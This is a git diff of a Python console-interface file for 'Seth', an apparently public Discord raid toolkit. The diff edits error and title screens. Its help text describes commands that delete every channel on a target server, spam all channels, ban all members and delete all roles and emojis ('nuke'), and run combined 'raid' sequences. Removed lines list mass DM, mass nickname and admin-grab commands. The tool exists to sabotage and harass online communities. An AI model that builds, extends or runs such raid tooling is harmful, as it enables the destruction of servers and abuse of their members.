@@ -31,7 +31,7 @@ def check_for_run_settings():
         with open('run_settings.json', 'w') as f:
             json.dump(DATA, f, indent=4)
             f.close()
-        display_start_error()
+        display_start_error("Generated run_settings.json - close this error window!")
 
 
 # Check for code in temp.txt.
@@ -58,23 +58,10 @@ def write_temp():
         f.close()
     return
 
-
-# Check for the servers.txt file and generate a new file if not found.
-
-def check_for_servers():
-    try:
-        with open('cogs/servers.txt', 'r') as f:
-            f.close()
-    except FileNotFoundError:
-        with open('cogs/servers.txt', 'w') as f:
-            f.close()
-    return
-
-
 # Display an error screen if an error is encountered whilst starting the
 # program.
 
-def display_start_error():
+def display_start_error(e):
     os.system('cls')
     print(Fore.BLUE + Style.DIM + f'''
 
@@ -86,6 +73,7 @@ def display_start_error():
                                             ███████║███████╗   ██║   ██║  ██║
                                             ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
 
+                                            {Fore.RED}{e}
 
       {Fore.WHITE}Human. There has been an error attempting to run Seth. The following measures may solve the issue:{Style.NORMAL}
 
@@ -117,29 +105,19 @@ def display_title_screen():
                                             ███████║███████╗   ██║   ██║  ██║
                                             ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
 
-{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:{Back.RESET}{Style.NORMAL}
+{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server{Back.RESET} - {Back.RED}permissions are needed:{Back.RESET}{Style.NORMAL}
 
-{Style.BRIGHT}{Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_leave {CODE}: Makes the bot leave every server.
-{Style.DIM}{Fore.YELLOW}{DATA.get('prefix')}mass_nick {CODE} <nickname>: Change the nickname of all members on a server.
-{Style.NORMAL}{Fore.GREEN}{DATA.get('prefix')}mass_dm {CODE} <message>: Message all of the members on a server with a custom message.
-{Fore.BLUE}{DATA.get('prefix')}spam {CODE} <message>: Repeatedly spam all text channels on a server with a custom message.
-{Style.DIM}{Fore.MAGENTA}{DATA.get('prefix')}cpurge {CODE}: Delete all channels on a server.
-{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{DATA.get('prefix')}admin {CODE} <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
-{Style.DIM}{Fore.RED}{DATA.get('prefix')}nuke {CODE}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
-{Style.BRIGHT}{Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nuke {CODE}: Nuke every server the bot is currently in.
-{Style.DIM}{Fore.YELLOW}{DATA.get('prefix')}raid {CODE} <role_name> <nickname> <channel_name> <num_of_channels> <message>:
-Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
-then create x number of channels, then message everyone with a message, then spam all channels with a message.
+{Style.DIM}{Fore.RED}{DATA.get('prefix')}cpurge {CODE}: Delete all channels on a server.
+{Style.BRIGHT}{Fore.LIGHTRED_EX}{DATA.get('prefix')}spam {CODE} <message>: Repeatedly spam all text channels on a server with a custom message.
+{Style.DIM}{Fore.YELLOW}{DATA.get('prefix')}raid {CODE} <channel_name> <num_of_channels> <message>:
+Delete all channels, then create x number of channels, then spam all channels with a message.
+{Style.DIM}{Fore.GREEN}{DATA.get('prefix')}nuke {CODE}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
 
-{Style.DIM}{Fore.GREEN}Additional notes:
-{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke commands, make sure the role created by the bot upon its invite is above the roles of the
-members you wish to ban (i.e. move the role as high as possible).
 
 {Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{DATA.get('prefix')}refresh {CODE}
 
-{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall/discord-raidkit{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.YELLOW}{Style.DIM}'))
+{Fore.LIGHTRED_EX}Seth created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall/discord-raidkit{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.YELLOW}{Style.DIM}'))
     return
-
 
 # Used in the refresh command.
 
@@ -149,30 +127,17 @@ def refresh():
     display_title_screen()
     return
 
-
 # Used to display errors in Anubis commands.
 
 def command_error(cmd):
     if cmd == "nuke":
         print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}nuke {CODE}{Fore.RED}.{Fore.RESET}")
-    elif cmd == "mass_nuke":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nuke {CODE}{Fore.RED}.{Fore.RESET}")
     elif cmd == "cpurge":
         print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}cpurge {CODE}{Fore.RED}.{Fore.RESET}")
-    elif cmd == "mass_dm":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_dm {CODE} <message>{Fore.RED}.{Fore.RESET}")
     elif cmd == "spam":
         print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}spam {CODE} <message>{Fore.RED}.{Fore.RESET}")
-    elif cmd == "mass_nick":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nick {CODE} <nickname>{Fore.RED}.{Fore.RESET}")
-    elif cmd == "leave":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}leave {CODE} <server>{Fore.RED}.{Fore.RESET}")
-    elif cmd == "mass_leave":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_leave {CODE}{Fore.RED}.{Fore.RESET}")
-    elif cmd == "admin":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}admin {CODE} <role_name>{Fore.RED}.{Fore.RESET}")
     elif cmd == "raid":
-        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: ({Fore.LIGHTRED_EX}{DATA.get('prefix')}raid {CODE} <role_name> <nick_name> <channel_name> <num_of_channels> <message>{Fore.RED}.{Fore.RESET}")
+        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: ({Fore.LIGHTRED_EX}{DATA.get('prefix')}raid {CODE} <channel_name> <num_of_channels> <message>{Fore.RED}.{Fore.RESET}")
     elif cmd == "refresh":
         print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}refresh {CODE}{Fore.RED}.{Fore.RESET}")
     else:
@@ -183,7 +148,7 @@ def command_error(cmd):
 # Search the GitHub repository for the latest release.
 
 def search_for_updates():
-    THIS_VERSION = "1.5.2"
+    THIS_VERSION = "1.5.3"
 
     header = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
